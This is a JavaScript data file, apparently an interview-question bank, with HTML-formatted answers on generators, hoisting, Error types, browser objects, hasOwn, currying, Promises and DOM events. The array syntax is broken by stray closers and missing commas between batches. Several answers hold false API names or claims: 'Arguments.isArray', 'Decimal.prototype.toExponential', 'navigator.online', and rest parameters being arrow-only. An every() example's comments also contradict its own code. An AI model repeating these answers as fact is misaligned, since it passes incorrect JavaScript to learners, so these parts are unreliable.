   a:"<strong>Generator function variations and edge cases:</strong><br><pre>// Regular generator\nfunction* gen1() { yield 1; }\n\n// Arrow generators — NOT possible!\n// const gen2 = () => { yield 1; }; // SyntaxError\n\n// Generator methods\nconst obj = {\n  *gen() { yield 1; } // shorthand\n};\n\n// Generator with return\nfunction* gen3() {\n  yield 1;\n  yield 2;\n  return 'done'; // value in .done frame\n}\nconst g = gen3();\ng.next(); // {value:1, done:false}\ng.next(); // {value:2, done:false}\ng.next(); // {value:'done', done:true}\n\n// throw() method\nfunction* gen4() {\n  try {\n    yield 1;\n  } catch(e) {\n    console.log('Caught:', e);\n  }\n}\nconst g4 = gen4();\ng4.next();\ng4.throw(new Error('boom'));\n\n// Generator without yield\nfunction* emptyGen() {} // valid but useless\n\n// Nested generators\nfunction* gen5() {\n  yield* [1, 2, 3]; // delegate to iterable\n}</pre>"},

  {q:"What is the difference between function hoisting and variable hoisting?",d:"medium",
   a:"<strong>Function declarations</strong> are fully hoisted (name + body).<br><strong>Function expressions</strong> are NOT hoisted — only the variable is hoisted to <code>undefined</code>.<br><br><strong>Variable hoisting:</strong> <code>var</code> is hoisted to <code>undefined</code>; <code>let</code>/<code>const</code> hoisted to Temporal Dead Zone.<br><pre>// Function declaration — fully hoisted\ncall(); // works!\nfunction call() { console.log('called'); }\n\n// Function expression — variable hoisted, not the function\nexpr(); // TypeError: expr is not a function\nvar expr = function() { console.log('expr'); };\n\n// let/const expression — Temporal Dead Zone\nfn(); // ReferenceError\nconst fn = () => {};</pre>"}
);


  // ── Error Handling & Built-in Types ──────────────────────────────────────
  {q:"What are the different Error types in JavaScript?",d:"medium",
   a:"JavaScript has multiple built-in Error types:<br><pre>// Error — base class\ntry { throw new Error('generic'); } catch(e) { e instanceof Error; }\n\n// ReferenceError — undeclared variable\nundefinedVariable; // ReferenceError\n\n// TypeError — wrong type\nnull.property;      // TypeError\nundefined();        // TypeError\n\n// SyntaxError — invalid syntax (at parse time)\n// eval('const a = ;'); // SyntaxError\n\n// RangeError — out of range\nnew Array(-1); // RangeError\n(1.5).toFixed(100); // RangeError\n\n// URIError — invalid URI\ndecodeURIComponent('%'); // URIError\n\n// EvalError — rare, eval() related\n\n// Custom error\nclass AppError extends Error {\n  constructor(msg, code) {\n    super(msg);\n    this.name = 'AppError';\n    this.code = code;\n  }\n}</pre>"},

  {q:"What is the BOM (Browser Object Model)?",d:"medium",
   a:"The <strong>BOM</strong> is the browser's API for interacting with the browser window (not the DOM).<br><br><strong>Main BOM objects:</strong><ul><li><code>window</code> — global object, contains all globals</li><li><code>navigator</code> — browser info (userAgent, language, platform)</li><li><code>location</code> — URL info (href, pathname, search, hash)</li><li><code>history</code> — back/forward buttons (back, forward, go)</li><li><code>screen</code> — screen resolution (width, height, colorDepth)</li></ul><br><pre>// window\nwindow.innerWidth; window.innerHeight;\nwindow.document; // also window.document\n\n// navigator\nnavigator.userAgent; // 'Mozilla/5.0...'\nnavigator.language;  // 'en-US'\n\n// location\nlocation.href;      // full URL\nlocation.pathname;  // '/page/path'\nlocation.search;    // '?param=value'\nlocation.hash;      // '#section'\nlocation.reload();\nlocation.assign('/new-url');\n\n// history\nhistory.back();    // same as back button\nhistory.go(-2);    // go back 2 pages\n\n// screen\nscreen.width;  // monitor width\nscreen.height; // monitor height</pre>"},

  {q:"What is the difference between the `in` operator and `hasOwnProperty()`?",d:"medium",
   a:"<strong><code>in</code> operator:</strong> returns <code>true</code> if property exists <strong>anywhere in the prototype chain</strong>.<br><strong><code>hasOwnProperty()</code>:</strong> returns <code>true</code> only for <strong>own</strong> (non-inherited) properties.<br><pre>const obj = { a: 1 };\n\n// 'a' is own property\n('a' in obj);             // true\nobj.hasOwnProperty('a');  // true\n\n// 'toString' is inherited\n('toString' in obj);        // true  — found in Object.prototype\nobj.hasOwnProperty('toString'); // false — not own\n\n// Comparison\nfunction Parent() { this.x = 1; }\nParent.prototype.y = 2;\nconst child = new Parent();\n\n('x' in child); // true  — own\n('y' in child); // true  — inherited\nchild.hasOwnProperty('x'); // true\nchild.hasOwnProperty('y'); // false</pre>"},

  {q:"What is the `instanceof` operator and its edge cases?",d:"medium",
   a:"<strong><code>instanceof</code></strong> checks if an object's prototype chain includes a constructor's prototype.<br><pre>const arr = [1, 2, 3];\narr instanceof Array;    // true\narr instanceof Object;   // true\n\nfunction User(name) { this.name = name; }\nconst u = new User('Alice');\nu instanceof User; // true\n\n// Edge cases\nconst obj = {};\nobj instanceof Object; // true\nobj instanceof Array;  // false\n\n// Across iframes — fails!\n// Different Array constructors — instanceof fails\n\n// Primitive wrappers\nconst num = new Number(5);\nnum instanceof Number; // true\n5 instanceof Number;   // false — primitive\n\n// typeof is safer for primitives\ntypeof 5; // 'number'\ntypeof 'hello'; // 'string'</pre>"},

  {q:"What is AJAX and how does it differ from the Fetch API?",d:"medium",
   a:"<strong>AJAX (Asynchronous JavaScript and XML):</strong> traditional way to send HTTP requests from JS using <code>XMLHttpRequest</code>.<br><br><strong>Differences from Fetch:</strong><table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>XMLHttpRequest</th><th style='padding:4px 8px'>Fetch</th></tr><tr><td style='padding:4px 8px'>API style</td><td style='padding:4px 8px'>Event-based</td><td style='padding:4px 8px'>Promise-based</td></tr><tr><td style='padding:4px 8px'>Syntax</td><td style='padding:4px 8px'>Verbose</td><td style='padding:4px 8px'>Clean</td></tr><tr><td style='padding:4px 8px'>Cancellation</td><td style='padding:4px 8px'>.abort()</td><td style='padding:4px 8px'>AbortController</td></tr><tr><td style='padding:4px 8px'>Progress</td><td style='padding:4px 8px'>Has progress event</td><td style='padding:4px 8px'>No native progress (use ReadableStream)</td></tr></table><br><pre>// XMLHttpRequest (old)\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', '/api/data');\nxhr.onload = () => console.log(xhr.responseText);\nxhr.onerror = () => console.error('Failed');\nxhr.send();\n\n// Fetch (modern)\nfetch('/api/data')\n  .then(r => r.json())\n  .then(data => console.log(data))\n  .catch(err => console.error('Failed'));</pre>"},

  {q:"What is the Fetch API and its request/response objects?",d:"medium",
   a:"<code>fetch()</code> makes HTTP requests returning a Promise.<br><pre>const response = await fetch('/api/data', {\n  method: 'GET',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ key: 'value' }),\n  credentials: 'include', // send cookies\n  mode: 'cors', // CORS mode\n});\n\n// Response object\nresponse.status;      // 200\nresponse.ok;          // true if 200-299\nresponse.statusText;  // 'OK'\nresponse.headers;     // Headers object\nconst json = await response.json();\nconst text = await response.text();\nconst blob = await response.blob();\nconst clone = response.clone(); // can read once\n\n// Request object\nconst req = new Request('/api/data', { method: 'POST', body: '...' });</pre>"},

  {q:"What is Constructor.prototype.constructor?",d:"medium",
   a:"Every constructor has a <code>.prototype</code> property. That prototype object has a <code>.constructor</code> property pointing back to the constructor.<br><pre>function User(name) { this.name = name; }\n\nUser.prototype.constructor === User; // true\n\nconst u = new User('Alice');\nu.constructor === User; // true — found via prototype chain\n\n// Problem: if you overwrite prototype, constructor is lost\nUser.prototype = { greet() { return 'hi'; } };\nUser.prototype.constructor === User; // false!\n\n// Fix\nUser.prototype.constructor = User; // or:\nUser.prototype = {\n  constructor: User,\n  greet() { return 'hi'; }\n};</pre>"},

  {q:"How do you check if a property exists safely?",d:"medium",
   a:"<strong>Multiple approaches (safest first):</strong><br><pre>const obj = { name: 'Alice' };\n\n// 1. Object.hasOwn (ES2022) — recommended\nObject.hasOwn(obj, 'name'); // true\n\n// 2. .hasOwnProperty() — needs null check\nobj.hasOwnProperty?.('name') || false;\n\n// 3. in operator — includes inherited\n('name' in obj); // true\n\n// 4. typeof — works even if undefined\n(typeof obj.name !== 'undefined'); // true\n\n// Safe with Object.create(null)\nconst bare = Object.create(null);\nbare.x = 1;\nObject.hasOwn(bare, 'x'); // true — safe!\nbare.hasOwnProperty('x'); // TypeError!\n\n// Safe with overridden hasOwnProperty\nconst evil = { hasOwnProperty: () => false };\nObject.hasOwn(evil, 'x'); // true — safe!\nevil.hasOwnProperty('x'); // false — wrong!</pre>"}

    // ── BATCH 5: Function Fundamentals ──────────────────────────────────────
    {q:"What is the arguments object?",d:"easy",
     a:"<strong>The <code>arguments</code> object</strong> is an array-like object available inside function bodies containing all passed arguments.<br><pre>function sum() {
  console.log(arguments); // array-like object
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}
sum(1, 2, 3); // 6</pre><br><strong>NOT a real array:</strong><br><pre>arguments instanceof Array; // false
arguments.length; // number of args
Arguments.isArray(arguments); // false</pre><br><strong>Convert to array:</strong><br><pre>const arr = Array.from(arguments);
const arr2 = [...arguments];
const arr3 = Array.prototype.slice.call(arguments);</pre><br><strong>Note:</strong> arrow functions don't have <code>arguments</code> — use rest parameters instead (<code>(...args) => {}</code>)."},
    {q:"What is the difference between arguments object and rest parameters?",d:"medium",
     a:"<strong>arguments object:</strong> array-like, includes all arguments, available in all functions (except arrows).<br><strong>Rest parameters:</strong> real array, explicitly named, only in arrow functions or with <code>...</code> syntax.<br><pre>// arguments object
function foo() {
  console.log(arguments); // Arguments {0: 'a', 1: 'b'}
  console.log(typeof arguments[Symbol.iterator]); // function (iterable)
}
foo('a', 'b');

// Rest parameters
function bar(...args) {
  console.log(args); // Array ['a', 'b']
  console.log(args instanceof Array); // true
}
bar('a', 'b');

// Named parameters + rest
function baz(first, ...rest) {
  console.log(first); // 'a'
  console.log(rest);  // ['b', 'c']
}
baz('a', 'b', 'c');</pre><br><strong>Advantages of rest:</strong> real array, clearer intent, works with arrows."},
    {q:"What is Function.prototype.length (arity)?",d:"medium",
     a:"<strong>Function.prototype.length</strong> returns the number of parameters (arity) a function expects, <strong>not</strong> the number passed.<br><pre>function sum(a, b, c) { return a + b + c; }
sum.length; // 3 — expects 3 parameters

sum(1, 2, 3, 4, 5); // 6 — call with 5 args, but length is 3

// Rest parameters not counted
function rest(a, b, ...args) {}
rest.length; // 2 — only counts a, b

// Default parameters stop the count
function defaults(a, b = 10, c) {}
defaults.length; // 1 — stops at first default</pre><br><strong>Use case:</strong> function introspection, validating expected parameters."},
    {q:"What is the `new` keyword and constructor functions?",d:"medium",
     a:"<strong>The <code>new</code> keyword</strong> creates a new object and sets it as <code>this</code>, then returns it.<br><pre>function User(name, age) {
  this.name = name;  // set on new object
  this.age = age;
}
const u = new User('Alice', 30);
console.log(u.name); // 'Alice'

// What new does:
// 1. Create new object
// 2. Set prototype: u.__proto__ === User.prototype
// 3. Call User with this = u
// 4. Return u (unless constructor returns an object)</pre><br><strong>Edge case:</strong> constructor returning an object:<br><pre>function Counter() {
  this.count = 0;
  return { count: 999 }; // returns this object instead
}
const c = new Counter();
c.count; // 999 — the returned object

function Counter2() {
  this.count = 0;
  return 42; // primitive — ignored, returns this
}
const c2 = new Counter2();
c2.count; // 0</pre>"},
    {q:"What is a variadic function?",d:"easy",
     a:"<strong>A variadic function</strong> accepts a variable number of arguments.<br><pre>// Using rest parameters (modern)
function sum(...nums) {
  return nums.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4, 5); // 15

// Using arguments object (legacy)
function product() {
  let result = 1;
  for (let i = 0; i < arguments.length; i++) {
    result *= arguments[i];
  }
  return result;
}
product(2, 3, 4); // 24</pre><br><strong>Common patterns:</strong> <code>console.log()</code>, <code>Array()</code>, <code>Object.assign()</code>."},
    {q:"What are function invocation modes and how does `this` change?",d:"hard",
     a:"<strong>1. Function invocation:</strong> <code>this</code> = undefined (strict) or window (non-strict).<br><strong>2. Method invocation:</strong> <code>this</code> = object calling method.<br><strong>3. Constructor invocation (new):</strong> <code>this</code> = new object.<br><strong>4. Explicit binding (call/apply/bind):</strong> <code>this</code> = specified object.<br><pre>const obj = { name: 'obj', greet() { return this.name; } };
const fn = obj.greet;

// 1. Function invocation
fn(); // undefined or 'window'

// 2. Method invocation
obj.greet(); // 'obj'

// 3. Constructor invocation
new fn(); // undefined (new object's property)

// 4. Explicit binding
fn.call(obj);   // 'obj'
fn.apply(obj, []);
const bound = fn.bind(obj);
bound(); // 'obj'</pre>"},
    {q:"What are the differences between call, apply, and bind?",d:"medium",
     a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Method</th><th style='padding:4px 8px'>Args format</th><th style='padding:4px 8px'>Execution</th></tr><tr><td style='padding:4px 8px'><code>call</code></td><td style='padding:4px 8px'>Individual</td><td style='padding:4px 8px'>Immediate</td></tr><tr><td style='padding:4px 8px'><code>apply</code></td><td style='padding:4px 8px'>Array</td><td style='padding:4px 8px'>Immediate</td></tr><tr><td style='padding:4px 8px'><code>bind</code></td><td style='padding:4px 8px'>Individual</td><td style='padding:4px 8px'>Returns function</td></tr></table><br><pre>function greet(greeting, punctuation) {
  return greeting + ' ' + this.name + punctuation;
}

const person = { name: 'Alice' };

// call — individual args, immediate
greet.call(person, 'Hello', '!');    // 'Hello Alice!'

// apply — array args, immediate
greet.apply(person, ['Hi', '?']);    // 'Hi Alice?'

// bind — returns new function
const bound = greet.bind(person, 'Hey');
bound('!'); // 'Hey Alice!'
bound('?'); // 'Hey Alice?'</pre>"},
    {q:"What is a pure function?",d:"easy",
     a:"<strong>A pure function</strong> always returns the same output for the same input and has no side effects.<br><pre>// Pure
function add(a, b) { return a + b; }
add(2, 3); // always 5

// NOT pure — uses external state
let global = 10;
function impure(x) { return x + global; } // depends on global

// NOT pure — modifies external state
const obj = { x: 1 };
function mutate(o) { o.x = 2; return o; } // side effect

// NOT pure — side effect (I/O)
function log(msg) {
  console.log(msg); // side effect
  return msg;
}</pre><br><strong>Benefits:</strong> predictable, testable, cacheable, parallelizable."},
    {q:"What is currying?",d:"medium",
     a:"<strong>Currying</strong> converts a function with multiple parameters into a series of functions with single parameters.<br><pre>// Regular function
function add(a, b, c) { return a + b + c; }
add(1, 2, 3); // 6

// Curried version
const curriedAdd = (a) => (b) => (c) => a + b + c;
curriedAdd(1)(2)(3); // 6

// Partial application
const add1 = curriedAdd(1);
const add1_2 = add1(2);
add1_2(3); // 6

// Generic currier
function curry(fn) {
  const arity = fn.length; // expected params
  return function currier(...args) {
    if (args.length >= arity) return fn(...args);
    return (...nextArgs) => currier(...args, ...nextArgs);
  };
}

const add2 = curry((a, b, c) => a + b + c);
add2(1)(2)(3); // 6
add2(1, 2)(3); // 6</pre>"},

    // ── BATCH 6: Error Handling & Built-in Types ──────────────────────────────
    {q:"What is the Error object and its properties?",d:"easy",
     a:"<strong>Error object</strong> contains information about runtime errors.<br><pre>try {
  throw new Error('Something went wrong');
} catch (e) {
  console.log(e.message);     // 'Something went wrong'
  console.log(e.name);        // 'Error'
  console.log(e.stack);       // stack trace
}</pre><br><strong>Properties:</strong><ul><li><code>message</code> — error message</li><li><code>name</code> — error type (Error, TypeError, etc.)</li><li><code>stack</code> — stack trace (non-standard but widely supported)</li><li><code>cause</code> — original error (ES2022)</li></ul><br><pre>// Create custom error with cause
try {
  doSomething();
} catch (e) {
  throw new Error('High-level error', { cause: e });
}</pre>"},
    {q:"What are Error types: ReferenceError, TypeError, SyntaxError, RangeError?",d:"medium",
     a:"<strong>ReferenceError:</strong> accessing undefined variable.<br><pre>console.log(undefinedVar); // ReferenceError: undefinedVar is not defined</pre><br><strong>TypeError:</strong> wrong type operation.<br><pre>null.property;        // TypeError
'string'.toUpperCase(); // works (method on string)
null.toUpperCase();   // TypeError: Cannot read property of null
42(); // TypeError: 42 is not a function</pre><br><strong>SyntaxError:</strong> invalid syntax (parse-time error).<br><pre>// const x = ; // SyntaxError
// eval('const a = ;'); // SyntaxError</pre><br><strong>RangeError:</strong> value out of valid range.<br><pre>new Array(-1);          // RangeError
(1.5).toFixed(999);     // RangeError
Decimal.prototype.toExponential(-1); // RangeError</pre><br><strong>URIError:</strong> invalid URI operation.<br><pre>decodeURIComponent('%');  // URIError: URI malformed</pre>"},
    {q:"What is try...catch...finally flow control?",d:"medium",
     a:"<strong>try...catch...finally:</strong> execute code, catch errors, guarantee cleanup.<br><pre>function test() {
  try {
    console.log('try');
    throw new Error('boom');
    console.log('after throw'); // not executed
  } catch (e) {
    console.log('catch:', e.message);
    return 1; // catch block return
  } finally {
    console.log('finally'); // ALWAYS executes
    return 2; // overrides catch return!
  }
}
test(); // logs: try, catch: boom, finally; returns 2</pre><br><strong>Return from finally overrides catch!</strong><br><pre>// Correct pattern
try {
  doSomething();
} finally {
  cleanup(); // no return in finally
}</pre><br><strong>Edge case: error in finally</strong><br><pre>try {
  throw new Error('first');
} finally {
  throw new Error('second'); // overwrites first error
}</pre>"},
    {q:"What is the window object and its key properties?",d:"medium",
     a:"<strong>The window object</strong> is the global object in browsers, containing all global variables and functions.<br><pre>// Global scope
var x = 5;
window.x; // 5

function greet() {}
window.greet; // function

// Window properties
window.innerWidth;     // viewport width
window.innerHeight;    // viewport height
window.outerWidth;     // browser window width
window.outerHeight;    // browser window height
window.scrollX;        // horizontal scroll
window.scrollY;        // vertical scroll
window.document;       // DOM document
window.location;       // URL info
window.navigator;      // browser info
window.history;        // back/forward
window.localStorage;   // storage

// Methods
window.alert('msg');
window.confirm('yes?');
window.prompt('enter:');
window.setTimeout(() => {}, 1000);
window.fetch('/api');</pre><br><strong>Note:</strong> in strict mode, <code>this</code> inside functions is <code>undefined</code>, not <code>window</code>."},
    {q:"What is the navigator object?",d:"easy",
     a:"<strong>The navigator object</strong> contains browser and OS information.<br><pre>navigator.userAgent;    // 'Mozilla/5.0...'
navigator.appName;      // 'Netscape'
navigator.appVersion;   // version
navigator.language;     // 'en-US'
navigator.languages;    // ['en-US', 'en']
navigator.platform;     // 'MacIntel', 'Win32'
navigator.online;       // true/false (connection)
navigator.onLine;       // same (alias)
navigator.geolocation;  // Geolocation API
navigator.permissions;  // Permissions API</pre><br><strong>Detect mobile:</strong><br><pre>const isMobile = navigator.userAgent.match(/Android|iPhone/i);</pre>"},
    {q:"What is the location object?",d:"easy",
     a:"<strong>The location object</strong> contains the current URL and methods for navigation.<br><pre>// Full URL: https://example.com:8080/path/page?id=1#section

location.href;      // 'https://example.com:8080/path/page?id=1#section'
location.protocol;  // 'https:'
location.hostname;  // 'example.com'
location.port;      // '8080'
location.pathname;  // '/path/page'
location.search;    // '?id=1'
location.hash;      // '#section'
location.origin;    // 'https://example.com:8080'

// Navigation methods
location.assign('/new-url');     // load new page (history)
location.replace('/new-url');    // replace current (no history)
location.reload();               // reload current page
location.reload(true);           // force refresh (bypass cache)</pre>"},
    {q:"What is Object.hasOwn() vs hasOwnProperty()?",d:"medium",
     a:"<strong>Object.hasOwn() (ES2022):</strong> recommended, safe method to check own properties.<br><strong>hasOwnProperty():</strong> old method, can be overridden.<br><pre>const obj = { name: 'Alice' };

// Modern (safe)
Object.hasOwn(obj, 'name'); // true

// Legacy (works but can be overridden)
obj.hasOwnProperty('name'); // true

// Problem with hasOwnProperty
const evil = { hasOwnProperty: () => false };
evil.hasOwnProperty('x');     // false (wrong!)
Object.hasOwn(evil, 'x');     // true (correct)

// Object.create(null) has no hasOwnProperty
const bare = Object.create(null);
bare.x = 1;
bare.hasOwnProperty('x');  // TypeError!
Object.hasOwn(bare, 'x');  // true (safe)</pre>"}
  
    // ── BATCH 7: Advanced Object & Property Management ──────────────────────
    {q:"What is Object.defineProperty()?",d:"hard",
     a:"<strong>Object.defineProperty()</strong> creates or modifies a property with precise control via property descriptors.<br><pre>const obj = {};

Object.defineProperty(obj, 'name', {
  value: 'Alice',
  writable: false,     // cannot change
  enumerable: true,    // appears in for...in
  configurable: true   // can delete
});

obj.name; // 'Alice'
obj.name = 'Bob'; // fails silently (or TypeError in strict)
obj.name; // 'Alice'</pre><br><strong>Getter/Setter:</strong><br><pre>Object.defineProperty(obj, 'age', {
  get() { return this._age; },
  set(val) { this._age = val; },
  enumerable: true,
  configurable: true
});</pre><br><strong>Defaults (if not specified):</strong> all are <code>false</code>!"},
    {q:"What are property descriptors?",d:"hard",
     a:"<strong>Property descriptors</strong> define how a property behaves.<br><br><strong>Data descriptors:</strong><ul><li><code>value</code> — the value</li><li><code>writable</code> — can be changed (default: false)</li></ul><br><strong>Accessor descriptors:</strong><ul><li><code>get</code> — getter function</li><li><code>set</code> — setter function</li></ul><br><strong>Both:</strong><ul><li><code>enumerable</code> — appears in for...in, Object.keys() (default: false)</li><li><code>configurable</code> — can delete or reconfigure (default: false)</li></ul><br><pre>Object.getOwnPropertyDescriptor(obj, 'x');
// {value: 1, writable: false, enumerable: false, configurable: false}</pre>"},
    {q:"What is Object.freeze() vs Object.seal()?",d:"medium",
     a:"<strong>Object.freeze():</strong> prevent all changes (no add, delete, modify).<br><strong>Object.seal():</strong> prevent add/delete, but can modify existing.<br><pre>const frozen = Object.freeze({ x: 1 });
frozen.x = 2; // fails
frozen.y = 3; // fails
delete frozen.x; // fails

const sealed = Object.seal({ x: 1 });
sealed.x = 2; // OK
sealed.y = 3; // fails
delete sealed.x; // fails</pre><br><strong>Shallow only:</strong><br><pre>const obj = Object.freeze({ a: { b: 1 } });
obj.a.b = 2; // OK — inner object not frozen!

// Deep freeze
function deepFreeze(o) {
  Object.freeze(o);
  Object.values(o).forEach(v => {
    if (typeof v === 'object') deepFreeze(v);
  });
}</pre>"},
    {q:"What is Object.keys() vs Object.getOwnPropertyNames() vs for...in?",d:"medium",
     a:"<strong>Object.keys():</strong> enumerable own properties.<br><strong>Object.getOwnPropertyNames():</strong> all own properties (enumerable + non-enumerable).<br><strong>for...in:</strong> enumerable own + inherited properties.<br><pre>function User(name) { this.name = name; }
User.prototype.greet = function() {};

const u = new User('Alice');

Object.defineProperty(u, 'id', {
  value: 123,
  enumerable: false // not enumerable
});

Object.keys(u); // ['name']
Object.getOwnPropertyNames(u); // ['name', 'id']
for (let key in u) console.log(key); // 'name', 'greet' (inherited!)</pre>"},
    {q:"What is Array.from() and its use cases?",d:"medium",
     a:"<strong>Array.from()</strong> converts array-like or iterable to array.<br><pre>// From array-like (arguments, NodeList, string)
function foo() {
  const arr = Array.from(arguments); // convert arguments
  return arr.map(x => x * 2);
}

// From string
Array.from('hello'); // ['h','e','l','l','o']

// From Set/Map
Array.from(new Set([1,1,2,2])); // [1,2]

// With mapping function
Array.from([1,2,3], x => x * 2); // [2,4,6]

// Fill array of N items
Array.from({length: 3}, (_, i) => i); // [0,1,2]</pre>"},
    {q:"What is Array.isArray() and Array.of()?",d:"easy",
     a:"<strong>Array.isArray():</strong> check if value is array (safe across iframes).<br><pre>Array.isArray([1,2,3]); // true
Array.isArray('hello'); // false
Array.isArray({length: 3}); // false</pre><br><strong>Array.of():</strong> create array from arguments (unlike Array constructor).<br><pre>Array(3);       // [empty × 3]
Array.of(3);    // [3]

Array(1, 2, 3); // [1,2,3]
Array.of(1, 2, 3); // [1,2,3]</pre>"},
    {q:"What are some() and every() short-circuit behavior?",d:"medium",
     a:"<strong>some():</strong> returns true if <strong>any</strong> element passes test. Stops on first true.<br><strong>every():</strong> returns true if <strong>all</strong> elements pass test. Stops on first false.<br><pre>[1,2,3,4,5].some(x => {
  console.log(x); // 1, 2, 3 — stops when x > 2 (true)
  return x > 2;
}); // true

[1,2,3,4,5].every(x => {
  console.log(x); // 1 — stops when x > 0 (false)
  return x > 0;
}); // false</pre><br><strong>Practical:</strong><br><pre>const hasNegative = nums.some(n => n < 0);
const allValid = users.every(u => u.age >= 18);</pre>"},

    // ── BATCH 8: Advanced Async & Promises ──────────────────────────────────
    {q:"What is Symbol type?",d:"hard",
     a:"<strong>Symbol</strong> is a unique, immutable primitive type for object keys.<br><pre>const sym1 = Symbol('id');
const sym2 = Symbol('id');

sym1 === sym2; // false — each is unique

const obj = {};
obj[sym1] = 'value1';
obj[sym2] = 'value2';

Object.keys(obj); // [] — symbols not enumerated
Object.getOwnPropertySymbols(obj); // [Symbol(id), Symbol(id)]</pre><br><strong>Global symbols:</strong><br><pre>const sym = Symbol.for('app.id'); // global registry
Symbol.for('app.id') === sym; // true
Symbol.keyFor(sym); // 'app.id'</pre><br><strong>Well-known symbols:</strong> <code>Symbol.iterator</code>, <code>Symbol.hasInstance</code>, <code>Symbol.toPrimitive</code>."},
    {q:"What is Promise.allSettled() vs Promise.all()?",d:"hard",
     a:"<strong>Promise.all():</strong> rejects if any promise rejects. Returns all resolved values or first error.<br><strong>Promise.allSettled():</strong> waits for all promises (resolved or rejected). Returns array of {status, value/reason}.<br><pre>// all() — fast reject
Promise.all([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]); // rejects with 'error' immediately

// allSettled() — get all results
Promise.allSettled([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]).then(results => {
  // [{status: 'fulfilled', value: 1},
  //  {status: 'rejected', reason: 'error'},
  //  {status: 'fulfilled', value: 3}]
});</pre><br><strong>Use case:</strong> allSettled for batch operations where some may fail."},
    {q:"What is Promise.any()?",d:"hard",
     a:"<strong>Promise.any():</strong> returns first <strong>fulfilled</strong> promise. Rejects if all reject (AggregateError).<br><pre>Promise.any([
  Promise.reject('a'),
  Promise.reject('b'),
  Promise.resolve('success')
]).then(val => console.log(val)); // 'success'

// All reject → AggregateError
Promise.any([
  Promise.reject('a'),
  Promise.reject('b')
]).catch(err => {
  console.log(err instanceof AggregateError); // true
  console.log(err.errors); // ['a', 'b']
});</pre><br><strong>Comparison:</strong><ul><li><code>Promise.race()</code> — first (resolved or rejected)</li><li><code>Promise.any()</code> — first fulfilled</li><li><code>Promise.all()</code> — all fulfilled</li></ul>"},
    {q:"What is AbortController?",d:"hard",
     a:"<strong>AbortController</strong> allows cancellation of fetch requests and other async operations.<br><pre>const controller = new AbortController();

const timeout = setTimeout(() => controller.abort(), 5000);

fetch('/api/data', { signal: controller.signal })
  .then(r => r.json())
  .then(data => console.log(data))
  .catch(err => {
    if (err.name === 'AbortError') console.log('Cancelled');
  })
  .finally(() => clearTimeout(timeout));</pre><br><strong>Usage:</strong> abort request, cancel promises, timeout patterns."},
    {q:"What are async generators?",d:"hard",
     a:"<strong>Async generator</strong> combines async/await with generators for async iteration.<br><pre>async function* asyncGen() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
  yield await Promise.resolve(3);
}

// Use with for await...of
for await (const val of asyncGen()) {
  console.log(val); // 1, 2, 3
}</pre><br><strong>Practical example — paginated API:</strong><br><pre>async function* fetchPages(url) {
  let page = 1;
  while (true) {
    const res = await fetch(url + '?page=' + page);
    const data = await res.json();
    if (!data.length) break;
    yield* data;
    page++;
  }
}</pre>"},

    // ── BATCH 9: DOM Events & APIs ──────────────────────────────────────────
    {q:"What is an event listener and addEventListener()?",d:"easy",
     a:"<strong>Event listeners</strong> execute code when an event occurs.<br><pre>element.addEventListener('click', function(event) {
  console.log('Clicked!');
});

// Named function (can remove later)
function handler(e) { console.log(e.type); }
element.addEventListener('click', handler);
element.removeEventListener('click', handler);</pre><br><strong>Options:</strong><br><pre>element.addEventListener('click', handler, {
  capture: true,   // capture phase
  once: true,      // remove after first
  passive: true    // won't call preventDefault (perf)
});</pre><br><strong>Inline (old style):</strong><br><pre>&lt;button onclick="alert('clicked')"&gt;Click&lt;/button&gt;</pre><br><strong>Better to use addEventListener — more flexible.</strong>"},
    {q:"What is event bubbling vs capturing?",d:"medium",
     a:"<strong>Event capturing (phase 1):</strong> event travels from window → target.<br><strong>Event bubbling (phase 3):</strong> event travels from target → window.<br><br><strong>HTML:</strong> &lt;div id='outer'&gt;&lt;p id='inner'&gt;Click&lt;/p&gt;&lt;/div&gt;<br><pre>// Capturing phase (goes down)
outer.addEventListener('click', handler, true);

// Bubbling phase (goes up)
outer.addEventListener('click', handler, false); // default
outer.addEventListener('click', handler); // default = false</pre><br><strong>Order:</strong> 1) Capturing down, 2) Target, 3) Bubbling up.<br><br><strong>Practical:</strong> use bubbling for event delegation, use capturing for early interception."},
    {q:"What is event delegation?",d:"medium",
     a:"<strong>Event delegation:</strong> attach listener to parent to handle child events (via bubbling).<br><pre>// Instead of:
const items = document.querySelectorAll('li');
items.forEach(li => {
  li.addEventListener('click', handler);
});

// Use delegation:
const list = document.getElementById('list');
list.addEventListener('click', (e) => {
  if (e.target.tagName === 'LI') {
    // handle li click
  }
});</pre><br><strong>Benefits:</strong> fewer listeners, handles dynamically added elements, better memory."},
    {q:"What is stopPropagation() vs stopImmediatePropagation()?",d:"hard",
     a:"<strong>stopPropagation():</strong> stop bubbling to parent, but other listeners on same element still fire.<br><strong>stopImmediatePropagation():</strong> stop all propagation and other listeners on same element.<br><pre>element.addEventListener('click', (e) => {
  console.log('1');
  e.stopPropagation(); // stop bubbling
});

element.addEventListener('click', (e) => {
  console.log('2'); // still fires!
});

element.parentElement.addEventListener('click', () => {
  console.log('3'); // does NOT fire
});

// Output: 1, 2

// With stopImmediatePropagation:
element.addEventListener('click', (e) => {
  console.log('1');
  e.stopImmediatePropagation();
});

element.addEventListener('click', () => {
  console.log('2'); // does NOT fire!
});

// Output: 1</pre>"},
    {q:"What is CustomEvent?",d:"hard",
     a:"<strong>CustomEvent</strong> creates custom events with arbitrary data.<br><pre>// Create
const evt = new CustomEvent('myEvent', {
  detail: { message: 'Hello', id: 42 }
});

// Dispatch
element.dispatchEvent(evt);

// Listen
element.addEventListener('myEvent', (e) => {
  console.log(e.detail.message); // 'Hello'
  console.log(e.detail.id);      // 42
});</pre><br><strong>Practical example:</strong><br><pre>class DataLoader {
  async load(url) {
    const data = await fetch(url).then(r => r.json());
    this.dispatchEvent(new CustomEvent('loaded', { detail: data }));
  }
}

const loader = new EventTarget();
loader.load = DataLoader.prototype.load;
loader.addEventListener('loaded', (e) => {
  console.log('Data:', e.detail);
});</pre>"},

